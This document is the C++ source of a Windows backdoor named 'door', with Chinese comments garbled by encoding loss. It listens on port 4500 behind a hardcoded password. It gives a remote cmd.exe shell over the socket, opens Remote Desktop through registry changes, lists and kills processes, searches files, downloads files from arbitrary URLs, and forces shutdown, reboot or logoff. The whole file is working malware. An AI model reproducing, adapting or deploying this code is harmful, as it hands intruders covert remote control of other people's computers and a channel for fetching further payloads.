// door.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <winsock2.h>
#include <tlhelp32.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "ws2_32.lib")

struct DirList{
	char table[256];
	DirList *pNext;
};

DirList *first,*newlist,*last;

//�����ļ�������
void AddList(char *list)
{
	newlist=new DirList;
	strcpy(newlist->table,list);
	newlist->pNext=NULL;
	//�����ļ�����Ϊ�գ���ô��һ�������һ���ڵ㶼ָ���½ڵ�
	if(first==NULL)
	{
		first=newlist;
		last=newlist;
	}
	//��Ϊ�գ���ԭ�����һ���ڵ�ָ���½ڵ�
	else
	{
		last->pNext=newlist;
		last=newlist;
	}	
}

//�����ļ��������ҵ����ļ��м����ļ�������
void FindFile(SOCKET s,char *pRoad,char *pFile)
{
	char FileRoad[256]={0};
	char DirRoad[256]={0};
	char FindedFile[256]={0};
	char FindedDir[256]={0};		
	strcpy(FileRoad,pRoad);
	strcpy(DirRoad,pRoad);
	strcat(DirRoad,"\\*.*");
	WIN32_FIND_DATA findData;
	HANDLE hFindFile;
	hFindFile=FindFirstFile(DirRoad,&findData);
	if(hFindFile!=INVALID_HANDLE_VALUE)
	{
		do
		{
			if(findData.cFileName[0]=='.')
				continue;
			//�������ļ��У�������ļ����б�
			if(findData.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)
			{
				strcpy(FindedDir,pRoad);	
				strcat(FindedDir,"\\");
				strcat(FindedDir,findData.cFileName);
				//�����ļ����б�
				AddList(FindedDir);
				memset(FindedDir,0x00,256);
			}
			//��������
		}while(FindNextFile(hFindFile,&findData));
	}	
	strcat(FileRoad,"\\");
	strcat(FileRoad,pFile);
	//����Ҫ���ҵ��ļ�
	hFindFile=FindFirstFile(FileRoad,&findData);
	if(hFindFile!=INVALID_HANDLE_VALUE)
	{
		do
		{ 
			strcpy(FindedFile,pRoad);
			strcat(FindedFile,"\\");
			strcat(FindedFile,findData.cFileName);
			strcat(FindedFile,"\r\n");
			//������ҵ����ļ�
			send(s,FindedFile,strlen(FindedFile),0);
			memset(FindedFile,0x00,256);
		}while(FindNextFile(hFindFile,&findData));
	}	
}

int SeachFile(SOCKET s,char *Directory,char *SeachFile)
{
	DirList NewList;
	strcpy(NewList.table,Directory);
	NewList.pNext=NULL;
	//��ʼ����һ�������һ���ڵ�
	last=&NewList;
	first=&NewList; 
	while(true)
	{	
		DirList *Find;
		//��������Ϊ�գ���ȡ�����еĵ�һ���ڵ㣬���ѵ�һ���ڵ�ָ��ԭ���ڶ���
		if(first!=NULL)
		{
			Find=first;
			first=first->pNext;
			FindFile(s,Find->table,SeachFile);		
		}
		//Ϊ����ֹͣ����
		else
		{
			send(s,"\r\n�ļ��������\r\n",strlen("\r\n�ļ��������\r\n"),0);
			return 0;		
		}		
	}	
	return 0;	
}

//�����޸��ַ����ͼ�ֵ
void CreateStringReg(HKEY hRoot,char *szSubKey,char* ValueName,char *Data)
{
	HKEY hKey;
	//��ע�������������򴴽���
	long lRet=RegCreateKeyEx(hRoot,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
    if (lRet!=ERROR_SUCCESS)
	{
		printf("error no RegCreateKeyEx %s\n", szSubKey);
		return ;
	}
	//�޸�ע����ֵ��û���򴴽���
	lRet=RegSetValueEx(hKey,ValueName,0,REG_SZ,(BYTE*)Data,strlen(Data));
	if (lRet!=ERROR_SUCCESS)
	{
		printf("error no RegSetValueEx %s\n", ValueName);
		return ;
	}
	RegCloseKey(hKey);
}

//�����޸��������ͼ�ֵ
void CreateDWORDReg(HKEY hRoot,char *szSubKey,char* ValueName,DWORD Data)
{
	HKEY hKey;
	//��ע�������������򴴽���
	long lRet=RegCreateKeyEx(hRoot,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
    if (lRet!=ERROR_SUCCESS)
	{
		printf("error no RegCreateKeyEx %s\n", szSubKey);
		return ;
	}
	DWORD dwSize=sizeof(DWORD);
	//�޸�ע����ֵ��û���򴴽���
	lRet=RegSetValueEx(hKey,ValueName,0,REG_DWORD,(BYTE*)&Data,dwSize);
	if (lRet!=ERROR_SUCCESS)
	{
		printf("error no RegSetValueEx %s\n", ValueName);
		return ;
	}
	RegCloseKey(hKey);
}

//�ػ�
void ShutDown()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	//������ǰ��������
	if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))
		return;
	//��ȡ�������ձ�ʾ�������ض���ϵͳ������Ȩ��
	LookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,&tkp.Privileges[0].Luid);
	tkp.PrivilegeCount=1;
	tkp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
	//������������Ȩ��
	AdjustTokenPrivileges(hToken,FALSE,&tkp,0,(PTOKEN_PRIVILEGES)NULL,0);
	//�ػ���Ҫʵ������ֻ�轫��һ����������EWX_REBOOT|EWX_FORCE
	//ע����һ����������EWX_LOGOFF|EWX_FORCE
	ExitWindowsEx(EWX_SHUTDOWN|EWX_FORCE,0);
	
}

//ע��
void LogOff()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))
		return;
	LookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,&tkp.Privileges[0].Luid);
	tkp.PrivilegeCount=1;
	tkp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken,FALSE,&tkp,0,(PTOKEN_PRIVILEGES)NULL,0);
    ExitWindowsEx(EWX_LOGOFF|EWX_FORCE,0);
	
}

//����
void Reboot()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))
		return;
	LookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,&tkp.Privileges[0].Luid);
	tkp.PrivilegeCount=1;
	tkp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken,FALSE,&tkp,0,(PTOKEN_PRIVILEGES)NULL,0);
    ExitWindowsEx(EWX_REBOOT|EWX_FORCE,0);
	
}

//cmdshell�̺߳���
DWORD WINAPI CmdThread( LPVOID lpParam )
{   
	SOCKET s=(SOCKET)lpParam;
	STARTUPINFO si;
	GetStartupInfo(&si);
    si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow=SW_HIDE;
	//ʹcmd���������ֱ�Ӻ�socket����
	si.hStdInput=si.hStdOutput=si.hStdError=(void*)s;
	char cmdline[256];
	//�õ�cmd·��
	GetSystemDirectory(cmdline,sizeof(cmdline));
	strcat(cmdline,"\\cmd.exe");
	PROCESS_INFORMATION ProcessInformation;
	int ret;
	//����cmd����
	ret=CreateProcess(NULL,cmdline,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
	//�ȴ����̽���
	WaitForSingleObject(ProcessInformation.hProcess,INFINITE);
	CloseHandle(ProcessInformation.hProcess);
	return 0;
}

//����3389
int Open3389(SOCKET s,DWORD Port)
{
	CreateStringReg(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\netcache","Enabled","0");
    CreateDWORDReg(HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\Windows\\Installer","EnableAdminTSRemote",0x00000001);
    CreateStringReg(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","ShutdownWithoutLogon","0");
    CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server","TSEnabled",0x00000001);
    CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\TermDD","Start",0x00000002);
    CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\TermService","Start",0x00000002);
	CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server","fDenyTSConnections",0x00000001);
    CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\RDPTcp","PortNumber",Port);
	CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp","PortNumber",Port);
    CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp","PortNumber",Port);
    CreateStringReg(HKEY_USERS,".DEFAULT\\Keyboard Layout\\Toggle","Hotkey","2");
    CreateDWORDReg(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server","fDenyTSConnections",0x00000000);
	OSVERSIONINFO osver={sizeof(OSVERSIONINFO)};
	GetVersionEx(&osver);
	//�ж��ǲ���windows 2000��������
	if(osver.dwMajorVersion==5&&osver.dwMinorVersion==0)
	{
		send(s,"\r\n�������������\r\n",sizeof("\r\n�������������\r\n"),0);
		Reboot();
	}
	send(s,"\r\nԶ���ն˿����ɹ�\r\n",sizeof("\r\nԶ���ն˿����ɹ�\r\n"),0);
	return 0;
	
}

//�оٽ���
int GetProcess(SOCKET s)
{
	char buff[1024]={0};
	PROCESSENTRY32 pe32;
	pe32.dwSize=sizeof(pe32);
	HANDLE hProcessSnap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if(hProcessSnap==INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot failed");
		return 0;
	}
	//ѭ���оٽ���
	BOOL bMore=Process32First(hProcessSnap,&pe32);
	while(bMore)
	{
		wsprintf(buff,"%s---------------%d\r\n",pe32.szExeFile,pe32.th32ProcessID);
		send(s,buff,strlen(buff),0);
		memset(buff,0x00,1024);	
		bMore=Process32Next(hProcessSnap,&pe32);
	}
        CloseHandle(hProcessSnap);
	return 0;
}

//��������
int KillProcess(SOCKET s,DWORD Pid)
{
	char sendData[80];
	//�򿪽��̵õ����̾��
	HANDLE hProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,Pid);
	if(hProcess==NULL)
	{ 		
		strcpy(sendData,"\r\n��������ʧ��\r\n");
		send(s,sendData,strlen(sendData),0);
		return 0;
	}
	//��������
	if (TerminateProcess(hProcess,0))
	{
		strcpy(sendData,"\r\n�������̳ɹ�\r\n");
		send(s,sendData,strlen(sendData),0);
		return 0;
	}
	else
	{
		strcpy(sendData,"\r\n��������ʧ��\r\n");
		send(s,sendData,strlen(sendData),0);
		return 0;
	}	
}

//�ж��ļ��Ƿ����
BOOL FileExists(LPCTSTR lpszFileName)
{
	//�õ��ļ�����
	DWORD dwAttributes=GetFileAttributes(lpszFileName);
	//�������óɹ����ļ�����
	if(dwAttributes==0xffffffff)
	{
		return false;
	}
	//�����ļ�������
	else
	{
		return true;
	}
}

//http�����ļ�
void download(SOCKET s,char *Url,char *FilePath)
{
	if(FileExists(FilePath))
	{
		//ɾ�������ļ�
		if(!DeleteFile(FilePath))
		{
			send(s,"\r\n�ļ��Ѵ��ڣ������޷�ɾ��\r\n",strlen("\r\n�ļ��Ѵ��ڣ������޷�ɾ��\r\n"),0);	
			return;
		}
	}
	//�����ļ�
	URLDownloadToFile(0,Url,FilePath,0,0);
	//�ж��ļ��治���ڣ���ȷ�����س������
	if(FileExists(FilePath))
	{
		send(s,"\r\n�ļ����سɹ�\r\n",strlen("\r\n�ļ����سɹ�\r\n"),0);	
	}
	else
	{
		send(s,"\r\n�ļ�����ʧ��\r\n",strlen("\r\n�ļ�����ʧ��\r\n"),0);
	}	
}

DWORD WINAPI DoorThread( LPVOID lpParam )
{
	
	SOCKET s=(SOCKET)lpParam;
	send(s,"door>",sizeof("door>"),0);
	char buff[1024]={0};
	char DoorData[1024]={0};
	int ret;
	
	while(true)
	{
		while(true)
		{
			//ÿ�ν���һ���ַ�
			if(ret=recv(s,buff,1,0)==SOCKET_ERROR)
			{
				closesocket(s);
				return 0;
			}
			//�����ǻس�������ѭ��
			if(buff[0]==0xa)
			{	
				break;
			}
			//���粻�ǻس��Ͱ��ַ��ۼӸ�DoorData
			if( buff[0]!=0xa&& buff[0]!=0xd)
				strcat(DoorData,buff);	
			
		}
		//����cmdshell
		if(strncmp(DoorData,"cmdshell",8)==0)
		{
			DWORD dwThreadId;
			HANDLE hThread;
			hThread=CreateThread(NULL,NULL,CmdThread,(LPVOID)s,0,&dwThreadId);
			WaitForSingleObject(hThread,INFINITE);	
		}
		//����Զ���ն�
		if(strncmp(DoorData,"open",4)==0)
		{
			char *port=DoorData;
			port=port+5;
			DWORD T_Port=atoi(port);
			Open3389(s,T_Port);	
		}
		//��ȡ�����б�
		if(strncmp(DoorData,"plist",5)==0)
		{
			GetProcess(s);
		}
		//��������
		if(strncmp(DoorData,"pkill",5)==0)
		{
			char *Pid=DoorData;
			Pid=Pid+6;
			DWORD P_id=atoi(Pid);
			KillProcess(s,P_id);	
		}
		//�����ļ�
		if(strncmp(DoorData,"seach",5)==0)
		{
			if(strlen(DoorData)>9)
			{
				char *AllData=DoorData;
				AllData=AllData+6;
				char PartData[256];
				strcpy(PartData,AllData);
				char *FileName=strstr(PartData," ");
				if(FileName!=NULL)
				{
					FileName=FileName+1;
					char *SeachFiles=FileName;
					FileName=FileName-1;
					*FileName=NULL;
					SeachFile(s,PartData,SeachFiles);
				}
			}
			
		}
		//http�����ļ�
		if(strncmp(DoorData,"down",4)==0)
		{
			if(strlen(DoorData)>20)
			{
				char *DownData=DoorData;
				DownData=DownData+5;
				char Url[256];
				strcpy(Url,DownData);
				char *Path=strstr(Url," ");
				if (Path!=NULL)
				{
					Path=Path+1;
					char *FilePath=Path;
					Path=Path-1;
					*Path=NULL;
					download(s,Url,FilePath);
				}
			}
		}
		//����
		if(strncmp(DoorData,"reboot",6)==0)
		{
			Reboot();	
		}
		//�ػ�
		if(strncmp(DoorData,"shutdown",8)==0)
		{
			ShutDown();
		}
		//ע��
		if(strncmp(DoorData,"logoff",6)==0)
		{
			LogOff();
		}
		//����
		if(strncmp(DoorData,"help",4)==0)
		{
			char HelpData[1024]="help  --����\r\nopen port  --����Զ���ն�\r\ncmdshell  --����cmdshell\r\nseach path filename  --�����ļ�\r\ndown httpurl filepath  --http�����ļ�\r\nreboot  --���������\r\nshutdown  --�رռ����\r\nlogoff  --ע���û�\r\nexit  --�˳�cmdshell\r\nquit  --�˳����ų���\r\n";
            send(s,HelpData,strlen(HelpData),0);
		}
		//�˳�����
		if(strncmp(DoorData,"quit",4)==0)
		{
			closesocket(s);
			return 0;
		}
		
		if(strlen(DoorData)||buff[0]==0xa) 
			send(s,"door>",sizeof("door>"),0);
		memset(DoorData,0,1024);
	}
	return 0;		
}

int main(int argc, char* argv[])
{
	char wMessage[512] = "========================  BackDoor by �����ѩ  ========================\r\n";
	//����socket����
	SOCKET sClient[5];
    //��ʼ��socket�����Ҽ����˿�
	WSADATA wsaData;
	WORD sockVersion = MAKEWORD(2, 2);
	if(WSAStartup(sockVersion, &wsaData) != 0)
        return 0;
	SOCKET sListen = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if(sListen == INVALID_SOCKET)
	{
		printf("socket error \n");
		return 0;
	}
	//����socket����
	sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(4500);
	sin.sin_addr.S_un.S_addr = INADDR_ANY;
	
	if(bind(sListen, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		printf("bind error \n");
		return 0;
	}
	//�����˿ڣ�����5��ʾ���ֻ�ܽ����������
	if(listen(sListen, 5) == SOCKET_ERROR)
	{
		printf("listen error \n");
		return 0;
	}
	DWORD dwThreadId;
	char buff[1024]={0};
	char PassWord[1024]={0};
	int ret;
	//ѭ�������ڽ������ӣ������ѭ��������ǰ��listen�����еĵڶ�������Ҫһ�£�
	//��Ϊֻ�ܽ���5�����ӣ�ѭ��һ�ν���һ�����ӣ�����ֻ��ѭ��5��
	for(int i=0;i<5;i++)
	{
		//��������
        sClient[i]  =accept(sListen,NULL,NULL);
		send(sClient[i],"PassWord:\r\n",strlen("PassWord:\r\n"),0);
		while(true)
		{
			//ÿ�ν���һ���ַ�
			if(ret=recv(sClient[i],buff,1,0)==SOCKET_ERROR)
			{
				closesocket(sClient[i]);
				return 0;
			}
			//�յ��س���������ѭ��
			if(buff[0]==0xa)
			{	
				break;
			}
			//���˻س���
			if( buff[0]!=0xa&& buff[0]!=0xd)
				strcat(PassWord,buff);	
		}
		//����������ȷ�򴴽������߳�
		if(strcmp(PassWord,"nohack")==0)
		{
			//���������߳�
			CreateThread(NULL,NULL,DoorThread,(LPVOID)sClient[i],0,&dwThreadId);
			//���ͻ�ӭ��Ϣ
			send(sClient[i],wMessage,strlen(wMessage),0);
		}
		//���������Ͽ�����
		else
		{
			send(sClient[i],"\r\n�������\r\n",strlen("\r\n�������\r\n"),0);
			closesocket(sClient[i]);
		}
	}
	return 0;
}
